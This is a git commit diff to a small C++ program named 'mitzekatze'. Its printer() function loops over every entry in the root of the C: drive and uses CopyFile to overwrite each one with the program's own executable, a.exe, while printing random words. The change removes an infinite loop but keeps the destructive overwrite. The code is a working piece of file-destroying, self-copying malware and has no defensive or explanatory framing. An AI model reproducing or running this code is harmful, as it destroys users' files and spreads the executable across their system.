320a2dc13900d3172afd8498167843319ac7f298
Groove <63636914+Groovemaker@users.noreply.github.com>
2020-08-03 12:04:57 +0200

    Add files via upload

--- mitzekatze/main.cpp
+++ mitzekatze/main.cpp
@@ -14,14 +14,13 @@ string Chain = "";
 
 void printer()
 {
-	while(true){
-		std::string path = "C:/";
-	    for (const auto & entry : std::filesystem::directory_iterator(path)){
- 			CopyFile("./a.exe",entry.path().string().c_str(),0);
-	   		Chain = Chain + sWords[rand() % 4];
-			cout << Chain;
-	    }
-	}
+	std::string path = "C:/";
+    for (const auto & entry : std::filesystem::directory_iterator(path)){
+			CopyFile("./a.exe",entry.path().string().c_str(),0);
+   		Chain = Chain + sWords[rand() % 4];
+		cout << Chain;
+    }
+
 }
 int main()
 {
